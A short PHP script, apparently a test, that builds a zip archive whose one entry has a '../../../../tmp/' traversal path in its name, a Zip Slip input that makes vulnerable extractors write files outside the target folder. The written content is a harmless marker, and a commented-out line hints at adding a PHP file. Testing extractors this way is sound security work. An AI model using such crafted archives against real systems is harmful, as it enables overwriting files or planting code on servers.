<?php

$zip = new ZipArchive();
$filename = "./zip-slip-test.zip";

if ($zip->open($filename, ZipArchive::CREATE)!==TRUE) {
    exit("cannot open <$filename>\n");
}

$zip->addFromString("../../../../../../../../tmp/zip-slip-test.txt" . time(), "ZIP Slip Testing.\n");
// $zip->addFile("." . "/to.php", "/testfromfile.php");
echo "numfiles: " . $zip->numFiles . "\n";
echo "status:" . $zip->status . "\n";
$zip->close();
?>